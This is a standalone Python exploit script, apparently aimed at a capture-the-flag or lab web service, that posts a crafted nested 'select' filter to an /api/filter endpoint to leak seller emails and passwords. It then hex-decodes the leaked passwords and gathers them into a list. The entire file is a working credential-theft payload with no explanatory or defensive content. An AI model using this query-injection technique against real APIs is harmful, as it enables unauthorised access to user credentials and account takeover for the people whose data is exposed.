#!/usr/bin/env python3
import requests
import sys
import binascii

BASE_URL = "http://94.237.62.255:54043"

def exploit_filter_password_leak():
    print("Attempting to exploit the filter endpoint to leak seller passwords...")
    payload = {
        "filter": {
            "select": {
                "seller": {
                    "select": {
                        "email": True,
                        "password": True
                    }
                }
            }
        }
    }
    
    try:
        response = requests.post(f"{BASE_URL}/api/filter", json=payload)
    except Exception as e:
        print("Request failed:", e)

    breached = []
    
    if response.status_code == 200:
        data = response.json()
        if isinstance(data, list):
            vulnerable = False
            for idx, item in enumerate(data):
                seller = item.get("seller")
                if seller and "password" in seller:
                    print(f"[VULNERABLE] Item {idx} - Exposed seller email and password: {seller['email']} / {seller['password']} ({binascii.unhexlify(seller['password'])})")
                    breached.append({seller['email']: binascii.unhexlify(seller['password'])})
                    vulnerable = True
            if not vulnerable:
                print("No seller passwords were exposed in the response.")
        else:
            print("Unexpected response format:", data)
    else:
        print(f"Request failed with status code {response.status_code}: {response.text}")

    return breached

if __name__ == "__main__":
    breached = exploit_filter_password_leak()


